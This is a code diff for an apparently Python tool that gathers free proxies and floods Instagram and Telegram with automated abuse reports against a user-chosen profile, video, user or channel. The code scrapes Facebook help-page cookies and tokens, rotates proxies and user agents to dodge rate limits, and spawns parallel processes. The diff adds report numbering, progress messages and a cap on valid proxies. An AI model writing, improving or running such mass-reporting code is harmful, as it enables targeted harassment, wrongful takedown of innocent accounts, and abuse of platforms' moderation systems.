@@ -17,8 +17,6 @@ from multiprocessing import Process
 from threading import Thread
 from queue import Queue
 
-# ─── Dependency Check ────────────────────────────────────────────────────────
-
 try:
     import requests
     from requests import Session, get as rget
@@ -120,13 +118,12 @@ def get_user_agent():
 
 
 def chunks(lst, n):
-    """Yield successive n-sized chunks from lst."""
     for i in range(0, len(lst), n):
         yield lst[i:i + n]
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-# PROXY HARVESTER — FAST MODE
+# PROXY HARVESTER
 # ═══════════════════════════════════════════════════════════════════════════════
 
 PROXY_SOURCES = [
@@ -142,20 +139,19 @@ PROXY_SOURCES = [
     "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
 ]
 
+MAX_VALID_PROXIES = 30
+
 
 def _test_http_proxy(proxy, result_queue):
-    """Quick single-proxy test — runs in thread."""
     ua = get_user_agent()
     try:
         s = Session()
         s.proxies = {"http": "http://" + proxy, "https": "http://" + proxy}
         s.headers.update({"User-Agent": ua, "Connection": "close"})
-        # Just check if we can connect — use short timeout
         resp = s.get("http://connectivitycheck.platform.hadielkadi.com/generate_204",
                      timeout=3, allow_redirects=False)
         if resp.status_code in (200, 204, 302, 301):
             result_queue.put(proxy)
-            print_success("Proxy: " + proxy)
         else:
             result_queue.put(None)
     except:
@@ -163,7 +159,6 @@ def _test_http_proxy(proxy, result_queue):
 
 
 def find_proxies():
-    """Fetch proxies from multiple online sources — fast threaded validation."""
     proxy_set = set()
     ua = get_user_agent()
 
@@ -186,18 +181,17 @@ def find_proxies():
             pass
 
     proxy_list = list(proxy_set)
+    random.shuffle(proxy_list)
     print_status("Found " + str(len(proxy_list)) + " raw proxies.")
 
     if not proxy_list:
         print_error("No proxies found from any source!")
         return []
 
-    # Test proxies using threads — 30 at a time
-    print_status("Testing proxies (30 concurrent threads)...")
+    print_status("Testing proxies (30 threads)...")
     valid = []
-    to_test = proxy_list[:120]  # Test up to 120 proxies max
+    to_test = proxy_list[:200]
 
-    # Process in batches of 30 threads
     for batch_start in range(0, len(to_test), 30):
         batch = to_test[batch_start:batch_start + 30]
         q = Queue()
@@ -208,34 +202,30 @@ def find_proxies():
             t.start()
             threads.append(t)
 
-        # Wait for all threads to finish (max 5 seconds)
         for t in threads:
             t.join(timeout=5)
 
-        # Collect results
         while not q.empty():
             result = q.get()
-            if result:
+            if result and result not in valid:
                 valid.append(result)
+                print_success("Proxy " + str(len(valid)) + "/" + str(MAX_VALID_PROXIES) + ": " + result)
 
-        if len(valid) >= 30:
+        if len(valid) >= MAX_VALID_PROXIES:
+            valid = valid[:MAX_VALID_PROXIES]
             break
 
     if not valid:
         print_status("No valid proxies found — using raw list.")
-        valid = proxy_list[:50]
+        valid = proxy_list[:MAX_VALID_PROXIES]
+    else:
+        valid = valid[:MAX_VALID_PROXIES]
 
-    # Trim to multiples of 5
-    if len(valid) % 5 != 0 and len(valid) > 5:
-        valid = valid[:len(valid) - (len(valid) % 5)]
-
-    valid = valid[:50]
     print_status("Got " + str(len(valid)) + " working proxies.")
     return valid
 
 
 def parse_proxy_file(fpath):
-    """Parse proxy file from local storage."""
     try:
         with open(fpath, "r") as f:
             proxies = []
@@ -246,8 +236,8 @@ def parse_proxy_file(fpath):
                 if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$', line):
                     proxies.append(line)
 
-        if len(proxies) > 50:
-            proxies = random.sample(proxies, 50)
+        if len(proxies) > MAX_VALID_PROXIES:
+            proxies = random.sample(proxies, MAX_VALID_PROXIES)
 
         print("")
         print_success(str(len(proxies)) + " proxies loaded from file!")
@@ -342,8 +332,7 @@ def _extract_tokens(text):
     return tokens
 
 
-def report_profile_attack(username, proxy):
-    """Report an Instagram profile."""
+def report_profile_attack(username, proxy, report_num):
     ses, ua = _setup_session(proxy)
     page_h = {}
     page_h.update(PAGE_HEADERS)
@@ -355,9 +344,11 @@ def report_profile_attack(username, proxy):
     try:
         res = ses.get("https://www.facebook.com/", headers=page_h, timeout=10)
         if res.status_code != 200 or '["_js_datr","' not in res.text:
+            print_error("[IG] Report #" + str(report_num) + " — failed to get FB cookies")
             return
         js_datr = res.text.split('["_js_datr","')[1].split('",')[0]
     except:
+        print_error("[IG] Report #" + str(report_num) + " — FB cookie error")
         return
 
     try:
@@ -368,12 +359,15 @@ def report_profile_attack(username, proxy):
             timeout=10
         )
         if res.status_code != 200 or "datr" not in res.cookies.get_dict():
+            print_error("[IG] Report #" + str(report_num) + " — no datr cookie")
             return
         datr = res.cookies.get_dict()["datr"]
         tokens = _extract_tokens(res.text)
         if not tokens:
+            print_error("[IG] Report #" + str(report_num) + " — token extraction failed")
             return
     except:
+        print_error("[IG] Report #" + str(report_num) + " — help page error")
         return
 
     form = {
@@ -403,15 +397,14 @@ def report_profile_attack(username, proxy):
             cookies={"datr": datr}, timeout=10
         )
         if res.status_code == 200:
-            print_success("[IG] Reported @" + username + " via " + (proxy or "direct"))
+            print_success("[IG] Report #" + str(report_num) + " for @" + username + " via " + (proxy or "direct"))
         else:
-            print_error("[IG] Report failed (" + str(res.status_code) + ")")
+            print_error("[IG] Report #" + str(report_num) + " failed (" + str(res.status_code) + ")")
     except:
-        print_error("[IG] Submission error for " + username)
+        print_error("[IG] Report #" + str(report_num) + " submission error")
 
 
-def report_video_attack(video_url, proxy):
-    """Report an Instagram video."""
+def report_video_attack(video_url, proxy, report_num):
     ses, ua = _setup_session(proxy)
     page_h = {}
     page_h.update(PAGE_HEADERS)
@@ -423,9 +416,11 @@ def report_video_attack(video_url, proxy):
     try:
         res = ses.get("https://www.facebook.com/", headers=page_h, timeout=10)
         if res.status_code != 200 or '["_js_datr","' not in res.text:
+            print_error("[IG] Video #" + str(report_num) + " — FB cookie error")
             return
         js_datr = res.text.split('["_js_datr","')[1].split('",')[0]
     except:
+        print_error("[IG] Video #" + str(report_num) + " — FB error")
         return
 
     try:
@@ -435,12 +430,15 @@ def report_video_attack(video_url, proxy):
             headers=page_h, timeout=10
         )
         if res.status_code != 200 or "datr" not in res.cookies.get_dict():
+            print_error("[IG] Video #" + str(report_num) + " — no datr")
             return
         datr = res.cookies.get_dict()["datr"]
         tokens = _extract_tokens(res.text)
         if not tokens:
+            print_error("[IG] Video #" + str(report_num) + " — token error")
             return
     except:
+        print_error("[IG] Video #" + str(report_num) + " — help page error")
         return
 
     form = {
@@ -470,19 +468,18 @@ def report_video_attack(video_url, proxy):
             cookies={"datr": datr}, timeout=10
         )
         if res.status_code == 200:
-            print_success("[IG] Video reported via " + (proxy or "direct"))
+            print_success("[IG] Video #" + str(report_num) + " reported via " + (proxy or "direct"))
         else:
-            print_error("[IG] Video report failed (" + str(res.status_code) + ")")
+            print_error("[IG] Video #" + str(report_num) + " failed (" + str(res.status_code) + ")")
     except:
-        print_error("[IG] Video submission error")
+        print_error("[IG] Video #" + str(report_num) + " submission error")
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # ATTACK ENGINE — Telegram
 # ═══════════════════════════════════════════════════════════════════════════════
 
-def report_telegram_user(username, proxy):
-    """Report a Telegram user."""
+def report_telegram_user(username, proxy, report_num):
     ses, ua = _setup_session(proxy)
     tg_h = {}
     tg_h.update(TG_HEADERS)
@@ -502,18 +499,17 @@ def report_telegram_user(username, proxy):
             "Origin": "https://telegram.org", "Referer": "https://telegram.org/abuse",
         }, timeout=10)
         if res.status_code in (200, 302, 303):
-            print_success("[TG] Report sent for @" + username + " via " + (proxy or "direct"))
+            print_success("[TG] Report #" + str(report_num) + " for @" + username + " via " + (proxy or "direct"))
         else:
-            print_error("[TG] Report returned " + str(res.status_code))
+            print_error("[TG] Report #" + str(report_num) + " returned " + str(res.status_code))
 
         ses.get("https://t.me/" + username, headers=tg_h, timeout=10)
 
     except Exception as e:
-        print_error("[TG] Report failed: " + str(e)[:40])
+        print_error("[TG] Report #" + str(report_num) + " failed: " + str(e)[:40])
 
 
-def report_telegram_channel(channel, proxy):
-    """Report a Telegram channel."""
+def report_telegram_channel(channel, proxy, report_num):
     ses, ua = _setup_session(proxy)
     tg_h = {}
     tg_h.update(TG_HEADERS)
@@ -531,58 +527,87 @@ def report_telegram_channel(channel, proxy):
             "Origin": "https://telegram.org", "Referer": "https://telegram.org/abuse",
         }, timeout=10)
         if res.status_code in (200, 302, 303):
-            print_success("[TG] Channel @" + channel + " reported via " + (proxy or "direct"))
+            print_success("[TG] Channel #" + str(report_num) + " for @" + channel + " via " + (proxy or "direct"))
         else:
-            print_error("[TG] Channel report returned " + str(res.status_code))
+            print_error("[TG] Channel #" + str(report_num) + " returned " + str(res.status_code))
     except Exception as e:
-        print_error("[TG] Channel report failed: " + str(e)[:40])
+        print_error("[TG] Channel #" + str(report_num) + " failed: " + str(e)[:40])
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# COUNTER
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class Counter:
+    def __init__(self):
+        self.val = [0]
+
+    def next(self):
+        self.val[0] += 1
+        return self.val[0]
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # PROCESS MANAGEMENT
 # ═══════════════════════════════════════════════════════════════════════════════
 
-def profile_attack_process(username, proxy_list):
+def profile_attack_process(username, proxy_list, counter):
     if not proxy_list:
         for _ in range(10):
-            report_profile_attack(username, None)
+            n = counter.next()
+            print_status("Sending IG profile report #" + str(n) + "...")
+            report_profile_attack(username, None, n)
             sleep(0.3)
         return
     for proxy in proxy_list:
-        report_profile_attack(username, proxy)
+        n = counter.next()
+        print_status("Sending IG profile report #" + str(n) + "...")
+        report_profile_attack(username, proxy, n)
         sleep(0.2)
 
 
-def video_attack_process(video_url, proxy_list):
+def video_attack_process(video_url, proxy_list, counter):
     if not proxy_list:
         for _ in range(10):
-            report_video_attack(video_url, None)
+            n = counter.next()
+            print_status("Sending IG video report #" + str(n) + "...")
+            report_video_attack(video_url, None, n)
             sleep(0.3)
         return
     for proxy in proxy_list:
-        report_video_attack(video_url, proxy)
+        n = counter.next()
+        print_status("Sending IG video report #" + str(n) + "...")
+        report_video_attack(video_url, proxy, n)
         sleep(0.2)
 
 
-def telegram_user_process(username, proxy_list):
+def telegram_user_process(username, proxy_list, counter):
     if not proxy_list:
         for _ in range(10):
-            report_telegram_user(username, None)
+            n = counter.next()
+            print_status("Sending TG user report #" + str(n) + "...")
+            report_telegram_user(username, None, n)
             sleep(0.3)
         return
     for proxy in proxy_list:
-        report_telegram_user(username, proxy)
+        n = counter.next()
+        print_status("Sending TG user report #" + str(n) + "...")
+        report_telegram_user(username, proxy, n)
         sleep(0.2)
 
 
-def telegram_channel_process(channel, proxy_list):
+def telegram_channel_process(channel, proxy_list, counter):
     if not proxy_list:
         for _ in range(10):
-            report_telegram_channel(channel, None)
+            n = counter.next()
+            print_status("Sending TG channel report #" + str(n) + "...")
+            report_telegram_channel(channel, None, n)
             sleep(0.3)
         return
     for proxy in proxy_list:
-        report_telegram_channel(channel, proxy)
+        n = counter.next()
+        print_status("Sending TG channel report #" + str(n) + "...")
+        report_telegram_channel(channel, proxy, n)
         sleep(0.2)
 
 
@@ -594,42 +619,44 @@ def profile_attack(proxies):
     username = ask_question("Enter the Instagram username to report")
     print(Style.RESET_ALL)
 
+    total = len(proxies) if proxies else 10
+    print_status("Starting profile attack on @" + username + "...")
+    print_status("Total reports to send: " + str(total) + "\n")
+
+    counter = Counter()
+
     if not proxies:
         for k in range(5):
-            p = Process(target=profile_attack_process, args=(username, []))
+            p = Process(target=profile_attack_process, args=(username, [], counter))
             p.start()
-            print_status(str(k + 1) + ". Transaction Opened!")
         return
 
-    chunk_list = list(chunks(proxies, 10))
-    print_status("Profile attack starting!\n")
-    i = 1
+    chunk_list = list(chunks(proxies, 6))
     for plist in chunk_list:
-        p = Process(target=profile_attack_process, args=(username, plist))
+        p = Process(target=profile_attack_process, args=(username, plist, counter))
         p.start()
-        print_status(str(i) + ". Transaction Opened!")
-        i += 1
 
 
 def video_attack(proxies):
     video_url = ask_question("Enter the Instagram video URL to report")
     print(Style.RESET_ALL)
 
+    total = len(proxies) if proxies else 10
+    print_status("Starting video attack...")
+    print_status("Total reports to send: " + str(total) + "\n")
+
+    counter = Counter()
+
     if not proxies:
         for k in range(5):
-            p = Process(target=video_attack_process, args=(video_url, []))
+            p = Process(target=video_attack_process, args=(video_url, [], counter))
             p.start()
-            print_status(str(k + 1) + ". Transaction Opened!")
         return
 
-    chunk_list = list(chunks(proxies, 10))
-    print_status("Video attack starting!\n")
-    i = 1
+    chunk_list = list(chunks(proxies, 6))
     for plist in chunk_list:
-        p = Process(target=video_attack_process, args=(video_url, plist))
+        p = Process(target=video_attack_process, args=(video_url, plist, counter))
         p.start()
-        print_status(str(i) + ". Transaction Opened!")
-        i += 1
 
 
 def telegram_attack(proxies):
@@ -637,43 +664,43 @@ def telegram_attack(proxies):
     print_status("2 - Report a channel/group")
     choice = ask_question("Select type")
 
+    counter = Counter()
+
     if choice == "1":
         username = ask_question("Enter Telegram username (without @)")
         print(Style.RESET_ALL)
+        total = len(proxies) if proxies else 10
+        print_status("Starting Telegram user attack on @" + username + "...")
+        print_status("Total reports to send: " + str(total) + "\n")
 
         if not proxies:
             for k in range(5):
-                p = Process(target=telegram_user_process, args=(username, []))
+                p = Process(target=telegram_user_process, args=(username, [], counter))
                 p.start()
-                print_status(str(k + 1) + ". Report thread opened!")
             return
 
-        chunk_list = list(chunks(proxies, 10))
-        i = 1
+        chunk_list = list(chunks(proxies, 6))
         for plist in chunk_list:
-            p = Process(target=telegram_user_process, args=(username, plist))
+            p = Process(target=telegram_user_process, args=(username, plist, counter))
             p.start()
-            print_status(str(i) + ". Report thread opened!")
-            i += 1
 
     elif choice == "2":
         channel = ask_question("Enter channel username (without @)")
         print(Style.RESET_ALL)
+        total = len(proxies) if proxies else 10
+        print_status("Starting Telegram channel attack on @" + channel + "...")
+        print_status("Total reports to send: " + str(total) + "\n")
 
         if not proxies:
             for k in range(5):
-                p = Process(target=telegram_channel_process, args=(channel, []))
+                p = Process(target=telegram_channel_process, args=(channel, [], counter))
                 p.start()
-                print_status(str(k + 1) + ". Report thread opened!")
             return
 
-        chunk_list = list(chunks(proxies, 10))
-        i = 1
+        chunk_list = list(chunks(proxies, 6))
         for plist in chunk_list:
-            p = Process(target=telegram_channel_process, args=(channel, plist))
+            p = Process(target=telegram_channel_process, args=(channel, plist, counter))
             p.start()
-            print_status(str(i) + ". Report thread opened!")
-            i += 1
     else:
         print_error("Invalid choice!")
         sys.exit(1)
